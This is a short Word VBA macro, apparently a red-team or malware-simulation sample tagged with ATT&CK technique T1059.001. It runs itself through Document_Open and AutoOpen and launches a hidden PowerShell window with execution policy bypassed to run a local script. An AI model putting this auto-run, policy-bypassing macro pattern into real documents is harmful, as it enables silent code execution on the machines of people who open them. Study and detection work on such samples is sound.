Private Sub Document_Open()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")

    ' [T1059.001] Spawn PowerShell — bypass policy, hidden window
    shell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile " & _
              "-WindowStyle Hidden -Command " & Chr(34) & _
              "& '" & Chr(34) & "powershell_script.ps1" & Chr(34) & "'" & Chr(34)
End Sub

Private Sub AutoOpen()
    Document_Open   ' Dual trigger: fires on both Document_Open and AutoOpen events
End Sub
